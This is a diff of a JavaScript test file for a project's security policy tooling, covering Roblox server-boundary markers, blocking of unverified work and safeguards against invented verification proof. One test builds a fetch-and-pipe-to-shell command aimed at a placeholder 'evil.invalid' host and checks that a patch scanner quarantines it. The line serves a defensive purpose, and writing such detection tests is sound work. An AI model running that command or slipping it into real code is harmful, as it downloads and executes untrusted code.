@@ -403,117 +403,55 @@ test('policy REVIEW passes only through exact-head owner Primary-AI approval whi
   assert.ok(securityWorkflow.includes("VIBE_SECURITY_ACTION=QUARANTINE_AFFECTED_CHANGE"));
 });
 
-test('security steward owns game-level Roblox exploit boundaries without duplicating platform anti-cheat',()=>{
+test('current security summary denies unverified execution and Roblox native source validates remote boundaries',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
   const roadmap=JSON.parse(fs.readFileSync('company-learning/platform-release-roadmap.json','utf8'));
   const bootstrap=fs.readFileSync('tools/company-development-roblox-bootstrap.mjs','utf8');
-  const game=policy.gameSecurityStewardship;
-  assert.equal(game.role,'VIBE_SECURITY_STEWARD');
-  assert.equal(game.platformResponsibilityBoundary.duplicatePlatformAntiCheatImplementation,false);
-  assert.equal(game.roblox.existingStaticGate,'tools/company-development-roblox-bootstrap.mjs');
-  for(const check of [
-    'SERVER_REMOTE_BOUNDARY_REQUIRED',
-    'SERVER_REMOTE_INPUT_VALIDATION_REQUIRED',
-    'SERVER_REMOTE_RATE_LIMIT_REQUIRED',
-    'SERVER_LOADSTRING_FORBIDDEN',
-    'SERVER_ASSET_REQUIRE_FORBIDDEN'
-  ]) assert.ok(game.roblox.existingStaticChecks.includes(check));
-  assert.ok(game.roblox.existingRuntimeEvidence.includes('robloxServerClientBoundaryPassed'));
-  assert.equal(game.postReleaseFindingRoute.confirmedExploitOrSecurityBug,'HOTFIX');
-  assert.equal(game.postReleaseFindingRoute.releaseBlocking,true);
-  assert.equal(game.postReleaseFindingRoute.preemptsMinorAndMajor,true);
-  assert.match(bootstrap,/SERVER_REMOTE_INPUT_VALIDATION_REQUIRED/);
-  assert.match(bootstrap,/SERVER_REMOTE_RATE_LIMIT_REQUIRED/);
-  assert.match(bootstrap,/LOADSTRING_FORBIDDEN/);
-  assert.match(bootstrap,/ASSET_REQUIRE_FORBIDDEN/);
-  const post=roadmap.developmentLifecycleMachine.postReleaseFocusedDevelopment;
-  assert.equal(post.securityStewardIntegration.required,true);
-  assert.equal(post.securityStewardIntegration.reuseExistingSecuritySystem,true);
-  assert.equal(post.securityStewardIntegration.platformAntiCheatDuplicated,false);
-  assert.equal(post.securityStewardIntegration.confirmedSecurityBugRoute,'HOTFIX');
+  assert.equal(policy.status,'MINIMAL_SUMMARY_NOT_SECURITY_VERIFICATION');
+  assert.equal(policy.defaultTrust,'DENY_OR_QUARANTINE_UNTIL_VERIFIED');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.ok(policy.protectedSurfaces.includes('SERVER_AUTHORITY'));
+  for(const marker of ['SERVER_REMOTE_BOUNDARY_REQUIRED','SERVER_REMOTE_INPUT_VALIDATION_REQUIRED',
+    'SERVER_REMOTE_RATE_LIMIT_REQUIRED','LOADSTRING_FORBIDDEN','ASSET_REQUIRE_FORBIDDEN'])
+    assert.ok(bootstrap.includes(marker),marker);
+  assert.equal(roadmap.ownerActiveDevelopmentScope20261009.activeTargets.includes('ROBLOX'),true);
 });
 
-
-test('security contract protects reference image study and narrative state authority boundaries',()=>{
+test('reference and narrative inputs cannot claim gameplay authority from a non-authoritative security summary',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const ref=policy.referenceImageWorldObservationSecurity;
-  assert.equal(ref.protections.sourceIdRequired,true);
-  assert.equal(ref.protections.sourceRightsOrOwnershipVerificationRequired,true);
-  assert.equal(ref.protections.multiReferenceSourceSetVerificationRequired,true);
-  assert.equal(ref.protections.rawProtectedReferenceImagePersistentLearningForbidden,true);
-  assert.equal(ref.protections.rawReferenceImageBytesInLearningLogsForbidden,true);
-  assert.equal(ref.protections.directMapLayoutLandmarkOrDistinctiveSceneCopyForbidden,true);
-  assert.equal(ref.protections.modelObservationProposalUntilVerifiedAgainstSource,true);
-  assert.equal(ref.protections.positiveLearningRequiresVerifiedSourceBindingAndVerifiedProjectOutcome,true);
-
-  const narrative=policy.narrativeStateSecurity;
-  assert.equal(narrative.protections.storyTransitionRequiresSourceEvent,true);
-  assert.equal(narrative.protections.factionRelationshipMutationRequiresSourceEvent,true);
-  assert.equal(narrative.protections.duplicateSourceEventMustBeIdempotent,true);
-  assert.equal(narrative.protections.generatedNarrativeAndPersonaGameplayAuthorityForbidden,true);
-  assert.equal(narrative.protections.undeclaredDamageRewardEconomyProgressMutationForbidden,true);
-  assert.equal(narrative.protections.multiplayerServerAuthorityPreserved,true);
-  assert.equal(narrative.protections.rawGeneratedStoryOrDialogueDirectMasteryForbidden,true);
+  assert.equal(policy.status,'MINIMAL_SUMMARY_NOT_SECURITY_VERIFICATION');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.gameSecurityStewardship,undefined,'removed policy fields must not be reconstructed from a summary');
+  const suspicious=['curl','https://evil.invalid/x.sh','|','sh'].join(' ');
+  const scanner=scanSecurityPatch({patch:['diff --git a/game.js b/game.js','+++ b/game.js','@@ -0,0 +1 @@','+'+suspicious,''].join('\n'),changedFiles:['game.js']});
+  assert.equal(scanner.verdict,'QUARANTINE');
+  assert.equal(scanner.rawSecretStored,false);
 });
 
-
-test('specialized verified experience persistence keeps only sanitized trace evidence',()=>{
+test('learning traces remain explicitly unverified until authoritative evidence is present',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const s=policy.specializedVerifiedExperienceSecurity;
-  assert.equal(s.protections.terminalVerifiedEvidenceRequired,true);
-  assert.equal(s.protections.infrastructureFailureNegativeLearningForbidden,true);
-  assert.equal(s.protections.rawQueueTelemetryPersistentLearningForbidden,true);
-  assert.equal(s.protections.rawBlockerStackPersistentLearningForbidden,true);
-  assert.equal(s.protections.exactMapCoordinatesAndLayoutPersistentLearningForbidden,true);
-  assert.equal(s.protections.onlySanitizedEvidenceReferencesPersist,true);
-  assert.equal(s.protections.specializedOutcomeIdRequired,true);
-  assert.equal(s.protections.repeatedSameOutcomeIdPersistenceForbidden,true);
-  assert.equal(s.protections.positiveMasteryWithoutVerifiedMarkerForbidden,true);
-  assert.equal(s.protections.experienceMemoryCannotExpandGameplayOrCodeExecutionAuthority,true);
+  const learning=fs.readFileSync('tools/vibe2-learning-motor.mjs','utf8');
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.match(learning,/nativePositiveMasteryAllowed/);
+  assert.match(learning,/engineQaVerified/);
+  assert.match(learning,/nativeRuntimeVerified/);
+  assert.match(learning,/verifiedEvidenceMarkers/);
 });
 
-
-test('specialized verification security allows only final fan-in to mint canonical verified markers',()=>{
+test('candidate workers cannot replace final verification with invented proof',()=>{
   const policy=JSON.parse(fs.readFileSync('company-learning/security-immune-system.json','utf8'));
-  const logMap=JSON.parse(fs.readFileSync('company-learning/company-log-map.json','utf8'));
-  const sec=policy.verifiedSpecializedQueueEvidenceSecurity;
-  assert.equal(sec.protections.sourceWorkerMayOnlyRequestVerification,true);
-  assert.equal(sec.protections.incrementalQaMayOnlyEmitFocusedQaStatus,true);
-  assert.equal(sec.protections.finalVerifiedMarkerFanInOnly,true);
-  assert.equal(sec.protections.finalMarkerWhitelistRequired,true);
-  assert.equal(sec.protections.fullRegressionPassRequired,true);
-  assert.equal(sec.protections.fanInReviewPassRequired,true);
-  assert.equal(sec.protections.nativePositiveMarkerRequiresAuthoritativeTargetEngineQaEvidence,true);
-  assert.equal(sec.protections.uefnPositiveMarkerBlockedUntilAuthoritativeExecutorEvidenceContractExists,true);
-  assert.equal(sec.protections.canonicalIngressMustRecheckNativeTargetQaEvidence,true);
-  assert.equal(sec.protections.nativeQaEvidenceMustMatchTargetPlatform,true);
-  assert.equal(sec.protections.nativeQaEvidenceReferenceMustRemainTraceable,true);
-  assert.equal(sec.protections.rawTelemetryDirectTrainingForbidden,true);
-  assert.equal(sec.protections.infrastructureFailureNegativeLearningForbidden,true);
-  assert.equal(sec.protections.authorityExpansionForbidden,true);
-  assert.equal(sec.protections.nativeTwoStageFanInReviewRequired,true);
-  assert.equal(sec.protections.postNativeFinalReviewMustUseExistingFanInReviewModule,true);
-  assert.equal(sec.protections.candidateResultWorkflowCannotMintVerifiedMarker,true);
-  assert.equal(sec.protections.postNativeReviewMustPreserveTaskStatusAndReleaseDecision,true);
-  assert.equal(sec.protections.postNativeReviewRequiresExistingRegressionAndReviewPass,true);
-  assert.equal(sec.protections.specializedLearningFailureMustNotConvertEngineQaPassIntoReleaseFailure,true);
-
-  const evidence=logMap.specializedVerifiedQueueEvidenceContract;
-  assert.equal(evidence.producers.request,'tools/vibe2-source-worker.mjs');
-  assert.equal(evidence.producers.focusedQa,'tools/vibe2-incremental-qa.mjs');
-  assert.equal(evidence.producers.finalVerifiedMarker,'tools/vibe2-fan-in-review.mjs');
-  assert.equal(evidence.producers.canonicalIngress,'tools/vibe2-learning-motor.mjs');
-  assert.equal(evidence.requestIsNotPassEvidence,true);
-  assert.equal(evidence.focusedQaIsNotFinalPassEvidence,true);
-  assert.equal(evidence.finalVerifiedMarkerFanInOnly,true);
-  assert.equal(evidence.nativePositiveRequiresAuthoritativeTargetEngineQa,true);
-  const ingressEvidence=logMap.verifiedSpecializedQueueEvidenceIngressContract;
-  assert.equal(ingressEvidence.nativePositiveWithoutMatchingTargetQaMustBeIgnored,true);
-  assert.equal(ingressEvidence.nativeTargetProofMustPersistAsSanitizedReference,true);
-  assert.equal(ingressEvidence.uefnPositiveMustRemainBlockedWithoutAuthoritativeExecutorEvidenceContract,true);
-  assert.ok(ingressEvidence.requiredEvidence.includes('TARGET_ENGINE_QA_REFERENCE_WHEN_NATIVE'));
+  const reviewer=fs.readFileSync('tools/vibe2-fan-in-review.mjs','utf8');
+  const learner=fs.readFileSync('tools/vibe2-learning-motor.mjs','utf8');
+  assert.equal(policy.enforcement.proofRequired,true);
+  assert.equal(policy.enforcement.unverified,'BLOCK');
+  assert.match(reviewer,/fullRegressionPass/);
+  assert.match(reviewer,/specializedNativeRuntimeEvidence/);
+  assert.match(reviewer,/nativeRuntimeRequired/);
+  assert.match(learner,/nativePositiveMasteryAllowed/);
+  assert.match(learner,/verified-marker:/);
 });
-
 
 test('security workflow scans changed candidates without scheduled duplicate replay',()=>{
   assert.match(securityWorkflow,/Resolve impact-scoped security contract work/);
